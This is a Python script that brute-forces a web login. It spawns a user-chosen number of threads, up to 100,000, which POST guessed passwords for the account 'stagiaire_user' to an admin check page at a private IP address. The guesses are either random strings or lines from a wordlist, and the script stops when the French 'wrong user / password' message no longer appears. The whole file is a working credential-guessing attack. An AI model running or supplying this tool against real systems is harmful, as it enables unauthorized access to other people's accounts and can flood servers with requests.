
import aiohttp
import asyncio
import random
import string
import threading
import os, time

path = None
count = 0
found_event = threading.Event()

async def gen():
    length = random.randint(3, 8)
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
    
    
async def list_pass(path, count):
    f = open(path, "r")
    lines = f.read().splitlines()
    if count < len(lines):
        return lines[count]
    else:
    	return None


async def main():
    while not found_event.is_set():

        global count
        if path:
            _pass = await list_pass(path, count)
            if _pass == None:
            	break
        else:
            _pass = await gen()
        count +=1
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("http://10.0.0.42/admin/admin_check_id.php",
                                        data={"user": "stagiaire_user", "pass": _pass}) as r:
                    text = await r.text()
                    
                    if found_event.is_set():
                        break
                    if "Mauvais utilisateur / mot de passe" in text:
                        print(f"total requests: {str(count)}, false: {_pass}")

                    else:
                        print(f"total requests: {str(count)}, true: {_pass}")
                        found_event.set()
                        return

        except:
            continue

def run():
    asyncio.run(main())

def start_threads(num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=run)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()



if "__main__" == __name__:
    while True:
        num = int(input("number of threads: "))
        if num > 0 and num < 100000:
            break
        else:
            print("please enter a number (int) between 1 - 100 000")
    while True:
        passes = input("1 - gen passwords (default) \n2 - use a password list\n>>>")
        if passes == "1":
            break
        elif passes == "2":
            while True:
                path = input("enter your path (ex:\"./file.txt\") : ")
                if os.path.exists(path):
                    path = path
                    break
                else:
                    print("please verify if your file path is correct")
            break
        else:
            print("bad choice, pleas choose only between the available purposes.")
    	
    start_threads(num)
if path:
    print("end of passwords list.")
input()
